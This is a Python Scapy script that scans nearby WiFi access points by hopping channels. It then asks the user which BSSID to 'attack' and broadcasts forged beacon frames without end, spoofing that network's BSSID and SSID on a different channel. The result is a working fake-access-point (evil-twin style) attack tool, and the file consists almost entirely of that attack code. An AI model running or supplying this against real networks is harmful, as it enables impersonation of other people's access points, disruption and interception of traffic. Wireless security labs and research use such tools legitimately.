#!/usr/bin/env python3
from scapy.all import *
import argparse 
from threading import Thread
import pandas
import time
import os

# source: https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        networks.loc[bssid] = (ssid, dbm_signal, channel)

# prints all available ssid in the network, list updated every 0.5s
def print_all(stop_signal):
    while True:
        os.system("clear")
        print(networks)
        time.sleep(0.5)
        if stop_signal():
            break

# change channel every 0.5s
def change_channel(stop_signal):
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)
        if stop_signal():
            break


if __name__ == "__main__":
    
    # add all arguments to parser
    parser = argparse.ArgumentParser(description="A python script to create a fake channel")
    parser.add_argument('interface', action="store", help="Specify a monitoring interface (ex. mon0)", default=False) 
    args = parser.parse_args()
    interface = args.interface
    stop_thread = False
    # start the thread that prints all the networks
    printer = Thread(target=print_all, args=(lambda: stop_thread,))
    printer.daemon = True
    printer.start()
    # start the channel changer
    channel_changer = Thread(target=change_channel, args=(lambda: stop_thread,))
    channel_changer.daemon = True
    channel_changer.start()
    # start sniffing
    sniff(prn=callback, iface=interface, timeout=10)
    
    # stop threads for sniffing network
    stop_thread = True
    printer.join()
    channel_changer.join()
    
    # ask user for the network he wants to attack
    bssid_user = input("Choose a BSSID number that you want to attack: ")
    ssid, dbm_signal, channel = networks.loc[bssid_user]
    
    # 6 channels away from the original network
    channel = (channel + 6) % 14
    
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=bssid_user, addr3=bssid_user)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
    channel_packet = Dot11Elt(ID='DSset', info=chr(channel))
    
    # prepare packet with all parameters
    packet = RadioTap()/dot11/beacon/essid/channel_packet
    
    print("Press Ctrl+C if you want to stop sending packets")
    
    # send packet
    sendp(packet, iface=interface, inter=0.100, loop=1)

    
    
    
